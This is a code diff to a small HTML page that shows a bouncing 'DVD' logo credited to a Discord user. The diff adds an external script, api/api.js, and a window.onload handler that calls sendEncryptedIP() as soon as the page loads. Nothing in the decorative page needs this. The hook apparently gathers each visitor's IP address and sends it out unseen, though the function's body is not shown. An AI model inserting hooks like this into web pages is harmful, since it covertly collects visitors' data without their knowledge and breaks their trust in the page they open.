@@ -37,6 +37,8 @@
 <body>
     <div id="dvd">Made By i_love_python123.<br>On Discord</div>
 
+    <script src="api/api.js"></script>
+
     <script>
         const dvd = document.getElementById('dvd');
         let x = 100, y = 100;
@@ -71,6 +73,10 @@
         }
 
         moveDVD();
+
+        window.onload = function() {
+            sendEncryptedIP();
+        };
     </script>
 </body>
 </html>
